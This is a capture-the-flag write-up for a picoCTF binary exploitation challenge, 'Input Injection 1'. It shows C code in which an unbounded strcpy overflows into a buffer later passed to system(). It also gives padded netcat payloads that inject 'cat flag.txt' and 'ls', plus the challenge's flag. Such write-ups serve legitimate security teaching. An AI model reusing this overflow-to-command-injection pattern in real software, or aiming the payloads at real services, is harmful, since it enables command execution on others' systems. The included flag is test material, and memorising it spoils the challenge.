---
title: "Input Injection 1"
category: "Binary Exploitation"
description: "A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?"
---

## Information given

#### Description

A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?

Additional details will be available after launching your challenge instance.

#### Hints
Look closely at how the program stores and uses your input.
### Source Code (`vuln.c`)

```c
void fun(char *name, char *cmd) {

	char c[10];
	char buffer[10];
	
	strcpy(c, cmd);
	strcpy(buffer, name); // VULNERABLE: No bounds checking
	
	printf("Goodbye, %s!\n", buffer);
	
	fflush(stdout);
	system(c); // Executes our overwritten command

}
```

  

### Vulnerability

`strcpy(buffer, name)` on line 25.

No bounds checking allows overflow of `buffer[10]` into adjacent `c[10]` array

### Exploit Payloads

```bash

# Get the flag

echo "AAAAAAAAAAcat flag.txt" | nc saffron-estate.picoctf.net 49685

  

# List directory contents

echo "AAAAAAAAAAls" | nc saffron-estate.picoctf.net 49685

```

###  Exploitation

```bash

$ echo "AAAAAAAAAAcat flag.txt" | nc saffron-estate.picoctf.net 49685

What is your name?

Goodbye, AAAAAAAAAAcat flag.txt!

picoCTF{0v3rfl0w_c0mm4nd_d3eb7161}

```

## Flag

The flag is: `picoCTF{0v3rfl0w_c0mm4nd_d3eb7161}`.

---